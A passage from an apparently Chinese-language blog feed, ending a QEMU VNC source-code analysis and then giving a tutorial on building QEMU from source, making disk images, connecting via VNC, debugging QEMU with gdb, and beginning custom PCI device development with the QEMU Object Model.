class="headerlink" title="四、vnc_client_update - 创建新的 VncJob 挂载到全局链表上"></a>四、vnc_client_update - 创建新的 VncJob 挂载到全局链表上</h2><p>当前面我们将特定的显示区域标记为 dirty 之后，最终会由 <code>vnc_update_client()</code> 函数来扫描 dirty 区域，并创建相应的 VncJob 挂载到全局的 queue 上，因此最后实际上还是由 vnc worker thread 完成推送的任务</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vnc_update_client</span><span class="hljs-params">(VncState *vs, <span class="hljs-type">int</span> has_dirty)</span><br>&#123;<br>    VncDisplay *vd = vs-&gt;vd;<br>    VncJob *job;<br>    <span class="hljs-type">int</span> y;<br>    <span class="hljs-type">int</span> height, width;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (vs-&gt;disconnecting) &#123;<br>        vnc_disconnect_finish(vs);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    vs-&gt;has_dirty += has_dirty;<br>    <span class="hljs-keyword">if</span> (!vnc_should_update(vs)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!vs-&gt;has_dirty &amp;&amp; vs-&gt;update != VNC_STATE_UPDATE_FORCE) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Send screen updates to the vnc client using the server</span><br><span class="hljs-comment">     * surface and server dirty map.  guest surface updates</span><br><span class="hljs-comment">     * happening in parallel don&#x27;t disturb us, the next pass will</span><br><span class="hljs-comment">     * send them to the client.</span><br><span class="hljs-comment">     */</span><br>    job = vnc_job_new(vs);  <span class="hljs-comment">// 创建新的 VncJob</span><br><br>    height = pixman_image_get_height(vd-&gt;server);<br>    width = pixman_image_get_width(vd-&gt;server);<br><br>    y = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-comment">// 扫描 dirty 区域</span><br>        <span class="hljs-type">int</span> x, h;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> x2;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> offset = find_next_bit((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *) &amp;vs-&gt;dirty,<br>                                             height * VNC_DIRTY_BPL(vs),<br>                                             y * VNC_DIRTY_BPL(vs));<br>        <span class="hljs-keyword">if</span> (offset == height * VNC_DIRTY_BPL(vs)) &#123;<br>            <span class="hljs-comment">/* no more dirty bits */</span><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        y = offset / VNC_DIRTY_BPL(vs);<br>        x = offset % VNC_DIRTY_BPL(vs);<br>        x2 = find_next_zero_bit((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *) &amp;vs-&gt;dirty[y],<br>                                VNC_DIRTY_BPL(vs), x);<br>        bitmap_clear(vs-&gt;dirty[y], x, x2 - x);<br>        h = find_and_clear_dirty_height(vs, y, x, x2, height);<br>        x2 = MIN(x2, width / VNC_DIRTY_PIXELS_PER_BIT);<br>        <span class="hljs-keyword">if</span> (x2 &gt; x) &#123;<br>            <span class="hljs-comment">// 创建新的 VncRect，挂载到 VncJob 上</span><br>            n += vnc_job_add_rect(job, x * VNC_DIRTY_PIXELS_PER_BIT, y,<br>                                  (x2 - x) * VNC_DIRTY_PIXELS_PER_BIT, h);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!x &amp;&amp; x2 == width / VNC_DIRTY_PIXELS_PER_BIT) &#123;<br>            y += h;<br>            <span class="hljs-keyword">if</span> (y == height) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    vs-&gt;job_update = vs-&gt;update;<br>    vs-&gt;update = VNC_STATE_UPDATE_NONE;<br>    vnc_job_push(job);  <span class="hljs-comment">// 挂载到全局 queue 上</span><br>    vs-&gt;has_dirty = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> n;<br>&#125;<br></code></pre></td></tr></table></figure><p>至此，Qemu 中 VNC 的工作流程基本分析完毕</p><h1 id="0xFF-总览"><a href="#0xFF-总览" class="headerlink" title="0xFF.总览"></a>0xFF.总览</h1><p>最后让我们重新看一下 Qemu VNC 的基本架构，这里再放一张从<a href="https://zhuanlan.zhihu.com/p/69568087">知乎</a>上偷来的一个 Qemu VNC 的基本架构图：</p><p><img src="https://s2.loli.net/2022/07/21/7BcC1jzxESl3ZWt.png" alt="image.png"></p><p>在 Qemu 中内部的显示结构如下图所示：</p><p><img src="https://s2.loli.net/2022/07/20/FUkehDzTocbtu4O.png" alt="image.png"></p><p>最终的更新调用链路则如下所示：</p><p><img src="https://s2.loli.net/2022/07/20/TVEaSGf7MgvjCO4.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;vnc，🐕都不用&lt;/p&gt;</summary>
    
    
    
    <category term="VIRTUALIZATION" scheme="http://blog.arttnba3.cn/categories/VIRTUALIZATION/"/>
    
    
    <category term="学习札记" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="Qemu" scheme="http://blog.arttnba3.cn/tags/Qemu/"/>
    
    <category term="虚拟化" scheme="http://blog.arttnba3.cn/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="VNC" scheme="http://blog.arttnba3.cn/tags/VNC/"/>
    
  </entry>
  
  <entry>
    <title>【VIRT.0x00】Qemu - I：Qemu 简易食用指南</title>
    <link href="http://blog.arttnba3.cn/2022/07/15/VIRTUALIZATION-0X00-QEMU-PART-I/"/>
    <id>http://blog.arttnba3.cn/2022/07/15/VIRTUALIZATION-0X00-QEMU-PART-I/</id>
    <published>2022-07-15T08:45:17.000Z</published>
    <updated>2023-04-13T08:36:31.720Z</updated>
    
    <content type="html"><![CDATA[<p>不如 VMWare👋</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>Qemu 是一款开源的虚拟机软件，支持多种不同架构的模拟（Emulation）以及配合 kvm 完成当前架构的虚拟化（Virtualization）的特性，是当前最火热的开源虚拟机软件</p><p><img src="https://s2.loli.net/2022/07/22/jfIDUCx5ZtMsHAY.png" alt="image.png"></p><p>Qemu 的基本运行架构如下图所示：</p><p><img src="https://s2.loli.net/2022/07/26/9L7HtFUQlyZdwXD.png" alt="image.png"></p><p>本篇文章笔者将简要叙述如何从源码编译特定架构的 Qemu 并进行一定程度的改造工作</p><h2 id="PRE-安装依赖"><a href="#PRE-安装依赖" class="headerlink" title="PRE.安装依赖"></a>PRE.安装依赖</h2><p>大概需要安装这些依赖：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt -y install ninja-build build-essential zlib1g-dev pkg-config libglib2.0-dev binutils-dev libpixman-1-dev libfdt-dev</span><br></code></pre></td></tr></table></figure><h1 id="0x01-从源码编译-QEMU"><a href="#0x01-从源码编译-QEMU" class="headerlink" title="0x01.从源码编译 QEMU"></a>0x01.从源码编译 QEMU</h1><h2 id="一、获取-QEMU-源码"><a href="#一、获取-QEMU-源码" class="headerlink" title="一、获取 QEMU 源码"></a>一、获取 QEMU 源码</h2><p>大概有两种途径：从官网下载或是直接从 Qemu 的GitHub 仓库拉下来。</p><h3 id="I-官网下载源码"><a href="#I-官网下载源码" class="headerlink" title="I.官网下载源码"></a>I.官网下载源码</h3><p>前往 <a href="https://download.qemu.org/">qemu 的官网</a>进行下载：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">wget https://download.qemu.org/qemu-7.0.0.tar.xz</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">tar -xf qemu-7.0.0.tar.xz</span><br></code></pre></td></tr></table></figure><h3 id="II-GitHub-获取源码"><a href="#II-GitHub-获取源码" class="headerlink" title="II. GitHub 获取源码"></a>II. GitHub 获取源码</h3><p>直接从 <a href="https://github.com/qemu/qemu">GitHub</a> 上面拉也行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> git@github.com:qemu/qemu.git</span><br></code></pre></td></tr></table></figure><h2 id="二、配置编译选项"><a href="#二、配置编译选项" class="headerlink" title="二、配置编译选项"></a>二、配置编译选项</h2><p>接下来创建 build 目录并配置对应的编译选项：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> build &amp;&amp; <span class="hljs-built_in">cd</span> build</span><br><span class="hljs-meta prompt_">build$ </span><span class="language-bash">../qemu-7.0.0/configure --enable-kvm --target-list=x86_64-softmmu --enable-debug</span><br></code></pre></td></tr></table></figure><p>这里我们手动指定了这几个编译选项：</p><ul><li><code>--enable-kvm</code>：开启 kvm 支持</li><li><code>--target-list=&lt;架构名&gt;</code>：指定要编译的 CPU 架构，这里我们指定为 <code>x86_64-softmmu</code> 即表示我们要编译 x86 架构的 64位 CPU</li><li><code>--enable-debug</code>：能够对 Qemu 进行调试</li></ul><blockquote><p>如果我们不指定的话会把所有架构都编译一遍，不过这里笔者只需要 x86 的；）</p></blockquote><h2 id="三、开始编译"><a href="#三、开始编译" class="headerlink" title="三、开始编译"></a>三、开始编译</h2><p>直接 make 就完事了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">build$ </span><span class="language-bash">make</span><br></code></pre></td></tr></table></figure><p>需要花的时间还是不短的，在笔者的小破服务器上编译大概需要十几分钟左右，大概编译了两千多个文件，完成之后在当前目录下就会有一个热乎乎的可执行文件 <code>qemu-system_x86-64</code>，这个就是 Qemu 的本体了</p><p>之后可以 make install 给他安到 bin 里边，这样就能直接从命令行启动了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">build$ </span><span class="language-bash">sudo make install</span><br></code></pre></td></tr></table></figure><h1 id="0x02-构建系统镜像并使用-vnc-连接"><a href="#0x02-构建系统镜像并使用-vnc-连接" class="headerlink" title="0x02.构建系统镜像并使用 vnc 连接"></a>0x02.构建系统镜像并使用 vnc 连接</h1><p>空有一个 <code>qemu</code> 的可执行文件还不行，我们最终还是要在 qemu 上面跑一个完整的操作系统的，那么这里有两种方法：</p><ul><li>使用 <code>qemu-img</code> 创建虚拟机镜像文件，通过 <code>-cdrom</code> 参数指定载入一个 ISO 镜像文件来安装一个现有的操作系统</li><li>使用 <code>debootstrap</code> 创建 ext4 硬盘镜像，并直接运行一个现成的裸的内核镜像文件（bzImage）</li></ul><h2 id="一、创建虚拟机镜像文件并通过-CDROM-安装-Ubuntu"><a href="#一、创建虚拟机镜像文件并通过-CDROM-安装-Ubuntu" class="headerlink" title="一、创建虚拟机镜像文件并通过 CDROM 安装 Ubuntu"></a>一、创建虚拟机镜像文件并通过 CDROM 安装 Ubuntu</h2><h3 id="I-使用-qemu-img-创建虚拟机磁盘镜像文件"><a href="#I-使用-qemu-img-创建虚拟机磁盘镜像文件" class="headerlink" title="I.使用 qemu-img 创建虚拟机磁盘镜像文件"></a>I.使用 <code>qemu-img</code> 创建虚拟机磁盘镜像文件</h3><p>这一步比较简单，主要是用 <code>build</code> 目录下的 <code>qemu-img</code> 来完成构建：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./build/qemu-img create -f qcow2 test.qcow2 20G</span><br>Formatting &#x27;test.qcow2&#x27;, fmt=qcow2 cluster_size=65536 extended_l2=off compression_type=zlib size=21474836480 lazy_refcounts=off refcount_bits=16<br></code></pre></td></tr></table></figure><p>这里的 <code>-f</code> 参数指定的第一个参数为镜像格式，这里使用 QEMU 最通用的格式 <code>qcow2</code>；第二个参数为文件路径；第三个参数为镜像大小</p><blockquote><p>参见<a href="https://docs.fedoraproject.org/zh-CN/Fedora/12/html/Virtualization_Guide/sect-Virtualization_Guide-Tips_and_tricks-Using_qemu_img.html">这里</a></p></blockquote><h3 id="II-通过-vnc-连接完成安装"><a href="#II-通过-vnc-连接完成安装" class="headerlink" title="II.通过 vnc 连接完成安装"></a>II.通过 vnc 连接完成安装</h3><p>在 qemu 启动时通过 <code>-cdrom</code> 参数可以指定加载的ISO文件路径，这里笔者选择安装一个 Ubuntu 22.04：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ./build/qemu-system-x86_64 -m 2G -drive format=qcow2,file=test.qcow2 -enable-kvm -cdrom ~/Download/ubuntu-22.04-desktop-amd64.iso</span><br>VNC server running on ::1:5900<br></code></pre></td></tr></table></figure><p>参数说明如下：</p><ul><li><code>-m</code>：虚拟机的内存大小</li><li><code>-drive</code> ：qemu 启动时额外加载的设备，这里我们使用 <code>format=qcow2,file=test.qcow2</code> 指定了加载设备 <code>test.qcow2</code>、格式为 <code>qcow2</code></li><li><code>-enable-kvm</code> ：启用 kvm 模式，需要注意的是该选项<strong>要求以 root 权限运行</strong></li><li><code>-cdrom</code>：指定 qemu 启动时装载的光碟文件路径</li></ul><p>启动后 qemu 默认会在 5900 端口启动一个 VNC server，此时我们便能通过 VNC 连接到 qemu 上，需要注意的是这里<strong>只能在本地进行连接</strong></p><p>如果是运行在远程服务器上的话，我们还需要额外指定 <code>-vnc</code> 参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ./build/qemu-system-x86_64 -m 2G -drive format=qcow2,file=test.qcow2 -enable-kvm -cdrom ~/Download/ubuntu-22.04-desktop-amd64.iso -vnc yourip:0</span><br></code></pre></td></tr></table></figure><p>需要注意的是 <code>vnc</code> 参数中 ip 后面跟着的不是端口号，而是 <code>display numer</code>，对于默认的 <code>display 0</code> 而言其监听的端口号为 <code>5900</code>，而 <code>display 1</code> 就是 <code>5901</code> 端口，以此类推</p><p>之后我们便能通过 vnc 连接上远程服务器上的 qemu 了，这里笔者选择使用 <code>VNC Viewer</code> 进行连接：</p><p><img src="https://s2.loli.net/2022/07/11/3juM5iAgFERhYsS.png" alt="image.png"></p><p>成功连接上远程服务器上的 qemu：</p><p><img src="https://s2.loli.net/2022/07/11/UdlOA6DGaPFJqx2.png" alt="image.png"></p><p>之后就是常规的安装流程了，不过可能是由于 qemu 模拟显卡的问题（或者是 VNC 配置的问题），在一开始的时候安装界面的颜色会有点失真：</p><p><img src="https://s2.loli.net/2022/07/11/lsp4rnZqSdbcIGL.png" alt="image.png"></p><p>不过在安装准备结束的时候又恢复正常的颜色了，笔者目前推测应该是和显卡驱动有关：</p><p><img src="https://s2.loli.net/2022/07/11/g5jCb8yzmQYsvMd.png" alt="image.png"></p><p>之后就和正常使用虚拟机没有什么区别了，下次再次启动就不需要指定 <code>-cdrom</code> 参数了</p><p><img src="https://s2.loli.net/2022/07/11/WZiEx6vqnYapdl7.png" alt="image.png"></p><h2 id="二、构建-ext4-磁盘镜像并运行-kernel-bzImage"><a href="#二、构建-ext4-磁盘镜像并运行-kernel-bzImage" class="headerlink" title="二、构建 ext4 磁盘镜像并运行 kernel bzImage"></a>二、构建 ext4 磁盘镜像并运行 kernel bzImage</h2><p>如果你不需要一个完整的发行版 Linux 系统环境，只是想跑一个裸的简易的内核，也可以通过下面的方式完成：</p><h3 id="I-构建磁盘镜像"><a href="#I-构建磁盘镜像" class="headerlink" title="I.构建磁盘镜像"></a>I.构建磁盘镜像</h3><p>这里我们使用 <code>debootstrap</code> 来创建ext4硬盘镜像，直接使用由 Google 团队为 syzkaller 构建磁盘镜像的脚步即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install debootstrap</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> image</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> image</span><br><span class="hljs-meta prompt_">image$ </span><span class="language-bash">wget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.sh</span><br><span class="hljs-meta prompt_">image$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> +x create-image.sh</span><br><span class="hljs-meta prompt_">image$ </span><span class="language-bash">./create-image.sh</span><br></code></pre></td></tr></table></figure><p>完成之后在当前目录下就会有一个热乎乎的 <code>stretch.img</code>，这便是 ext4 磁盘镜像文件了</p><blockquote><p>wget 的这一步<strong>需要翻墙</strong>（<code>raw.githubusercontent.com</code> 在国内似乎是被墙了，总之笔者记忆里从没成功在不翻墙的情况下成功上去过），若嫌麻烦可以直接 copy <a href="/download/create-image.sh">笔者已经下好的</a></p></blockquote><h3 id="II-获取-kernel-bzImage"><a href="#II-获取-kernel-bzImage" class="headerlink" title="II.获取 kernel bzImage"></a>II.获取 kernel bzImage</h3><p>这部分参见<a href="http://arttnba3.cn/2021/02/21/OS-0X01-LINUX-KERNEL-PART-II/#0x01-%E8%8E%B7%E5%8F%96%E5%86%85%E6%A0%B8%E9%95%9C%E5%83%8F%EF%BC%88bzImage%EF%BC%89">这里</a></p><h3 id="III-运行-qemu-并通过-vnc-进行连接"><a href="#III-运行-qemu-并通过-vnc-进行连接" class="headerlink" title="III.运行 qemu 并通过 vnc 进行连接"></a>III.运行 qemu 并通过 vnc 进行连接</h3><p>创建如下 bash 脚本并运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>qemu-system-x86_64 \<br>-m 2G \<br>-smp 2 \<br>-kernel ./bzImage \<br>-append <span class="hljs-string">&quot;root=/dev/sda&quot;</span> \<br>-drive file=./stretch.img,format=raw \<br>-enable-kvm \<br>-vnc yourip:0<br></code></pre></td></tr></table></figure><p>之后还是直接用 vnc 进行连接即可（如果只需要在本地运行的话可以不用附加 <code>-vnc</code> 参数，而是加上 <code>-nographic</code> 参数）：</p><p><img src="https://s2.loli.net/2022/07/12/yjcVlhtYOz4pQvC.png" alt="image.png"></p><h1 id="0x03-QEMU-源码调试"><a href="#0x03-QEMU-源码调试" class="headerlink" title="0x03. QEMU 源码调试"></a>0x03. QEMU 源码调试</h1><p>QEMU 允许我们通过 <code>-s</code> 或是 <code>-gdb tcp::1234</code> 这样的附加参数来调试虚拟机（比如说调试 Linux kernel），但有的时候我们想要<strong>直接调试 QEMU 本体</strong>（比如说调试一些自己写的模拟设备），这个时候就需要我们将 Host 上的 QEMU 进程作为待调试对象</p><p>因为 QEMU 本身也是在 Host 上运行的一个进程，所以笔者这里给出一个比较直接的调试 QEMU 的办法：把 QEMU 本体启动起来后直接用 <code>ps</code> 找 QEMU 进程然后 gdb attach  即可像正常调试一个普通进程一样调试 QEMU：</p><p><img src="https://s2.loli.net/2023/04/13/ocrYWTQ4Nw3LEh5.png" alt="image.png"></p><p>如果是自己编译的 QEMU 这样就可以直接从源码进行调试了：</p><p><img src="https://s2.loli.net/2023/04/13/ol9OLkRDcusndU4.png" alt="image.png"></p><h1 id="0x04-简易-QEMU-设备编写"><a href="#0x04-简易-QEMU-设备编写" class="headerlink" title="0x04.简易 QEMU 设备编写"></a>0x04.简易 QEMU 设备编写</h1><p>虽然 Qemu 支持模拟多种设备，但是并不能涵盖现存所有的设备类型，同时有的时候出于一些特殊的目的我们也需要自定义一些设备，因此本节主要讲述如何在 Qemu 当中编写一个新的 PCI 类型的设备</p><blockquote><p>注1：在开始之前你可能需要补充一些<a href="https://arttnba3.cn/2022/08/30/HARDWARE-0X00-PCI_DEVICE/">PCI 设备的基础知识</a></p><p>注2：qemu 官方在 <code>hw/misc/edu.c</code> 中也提供了一个教学用的设备样例，red hat 则在 <code>hw/misc/pci-testdev.c</code> 中提供了一个测试设备，我们可以参考这两个设备来构建我们的设备</p></blockquote><h2 id="一、Qemu-Object-Model"><a href="#一、Qemu-Object-Model" class="headerlink" title="一、Qemu Object Model"></a>一、Qemu Object Model</h2><p>虽然 Qemu 是使用 C 编写的，但是其代码也充满了 OOP 的思想，在 Qemu 当中有着一套叫做 <strong>Qemu Object Model</strong> 的东西来实现面向对象，主要由这四个组件构成：</p><ul><li><code>Type</code>：用来定义一个「类」的基本属性，例如类的名字、大小、构造函数等</li><li><code>Class</code>：用来定义一个「类」的静态内容，例如类中存储的静态数据、方法函数指针等</li><li><code>Object</code>：动态分配的一个「类」的具体的实例（instance），储存类的动态数据</li><li><code>Property</code>：动态对象数据的访问器（accessor），可以通过监视器接口进行检查</li></ul><p>类似于 Golang，在 QOM 当中使用成员嵌套的方式来完成类的继承，父类作为类结构体的第一个成员 <code>parent</code> 而存在，因此也不支持多继承</p><blockquote><p>参见这个<a href="https://www.linux-kvm.org/images/f/f6/2012-forum-QOM_CPU.pdf">ppt</a></p></blockquote><h3 id="I、TypeInfo-类的基本属性"><a href="#I、TypeInfo-类的基本属性" class="headerlink" title="I、TypeInfo - 类的基本属性"></a>I、TypeInfo - 类的基本属性</h3><p><code>TypeInfo</code> 这一结构体用来定义一个「类」的基本属性，该结构体定义于 <code>include/qom/object.h</code> 当中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * TypeInfo:</span><br><span class="hljs-comment"> * @name: 类型名.</span><br><span class="hljs-comment"> * @parent: 父类型名.</span><br><span class="hljs-comment"> * @instance_size: 对象大小 (#Object 的衍生物). </span><br><span class="hljs-comment"> *   若 @instance_size 为 0, 则对象的大小为其父类的大小</span><br><span class="hljs-comment"> * @instance_init: 该函数被调用以初始化对象（译注：构造函数）. </span><br><span class="hljs-comment"> *   （译注：调用前）父类已被初始化，因此子类只需要初始化他自己的成员。</span><br><span class="hljs-comment"> * @instance_post_init: 该函数被调用以结束一个对象的初始化，</span><br><span class="hljs-comment"> *   在所有的 @instance_init 函数被调用之后.</span><br><span class="hljs-comment"> * @instance_finalize: 该函数在对象被析构时调用. 其在</span><br><span class="hljs-comment"> *   父类的 @instance_finalize 被调用之前被调用.</span><br><span class="hljs-comment"> *   在该函数中一个对象应当仅释放该对象特有的成员。</span><br><span class="hljs-comment"> * @abstract: 若该域为真，则该类为一个虚类，不能被直接实例化。</span><br><span class="hljs-comment"> * @class_size: 这个对象的类对象的大小 (#Object 的衍生物)</span><br><span class="hljs-comment"> *   若 @class_size 为 0, 则类的大小为其父类的大小。</span><br><span class="hljs-comment"> *   这允许一个类型在没有添加额外的虚函数时避免实现一个显式的类型。</span><br><span class="hljs-comment"> * @class_init: 该函数在所有父类初始化结束后被调用，</span><br><span class="hljs-comment"> *   以允许一个类设置他的默认虚方法指针.</span><br><span class="hljs-comment"> *   这也允许该函数重写父类的虚方法。</span><br><span class="hljs-comment"> * @class_base_init: 在所有的父类被初始化后、但</span><br><span class="hljs-comment"> *   在类自身初始化前，为所有的基类调用该函数。</span><br><span class="hljs-comment"> *   该函数用以撤销从父类 memcpy 到子类的影响.</span><br><span class="hljs-comment"> * @class_data: 传递给 @class_init 与 @class_base_init 的数据,</span><br><span class="hljs-comment"> *   这会在建立动态类型时有用。</span><br><span class="hljs-comment"> * @interfaces: 与这个类型相关的接口. </span><br><span class="hljs-comment"> *   其应当指向一个以 0 填充元素结尾的静态数组</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TypeInfo</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *parent;<br><br>    <span class="hljs-type">size_t</span> instance_size;<br>    <span class="hljs-type">void</span> (*instance_init)(Object *obj);<br>    <span class="hljs-type">void</span> (*instance_post_init)(Object *obj);<br>    <span class="hljs-type">void</span> (*instance_finalize)(Object *obj);<br><br>    <span class="hljs-type">bool</span> abstract;<br>    <span class="hljs-type">size_t</span> class_size;<br><br>    <span class="hljs-type">void</span> (*class_init)(ObjectClass *klass, <span class="hljs-type">void</span> *data);<br>    <span class="hljs-type">void</span> (*class_base_init)(ObjectClass *klass, <span class="hljs-type">void</span> *data);<br>    <span class="hljs-type">void</span> *class_data;<br><br>    InterfaceInfo *interfaces;<br>&#125;;<br></code></pre></td></tr></table></figure><p>当我们在 Qemu 中要定义一个「类」的时候，我们实际上需要定义一个 TypeInfo 类型的变量，例如下面就是一个在 Qemu 定义一个自定义类的🌰：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_type_info = &#123;<br>    .name = <span class="hljs-string">&quot;a3_type&quot;</span>,<br>    .parent = TYPE_OBJECT,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; &#125;,<br>    &#125;,<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> a3_register_types(<span class="hljs-type">void</span>) &#123;<br>    type_register_static(&amp;a3_type_info);<br>&#125;<br><br>type_init(a3_register_types);<br></code></pre></td></tr></table></figure><p><code>type_init()</code> 其实就是 <code>constructor</code> 这一 gcc attribute 的封装，其作用就是将一个函数加入到一个 <code>init_array</code> 当中，在 Qemu 程序启动时在进入到 main 函数之前会先调用 <code>init_array</code> 中的函数，因此这里会调用我们自定义的函数，其作用便是调用 <code>type_register_static()</code> 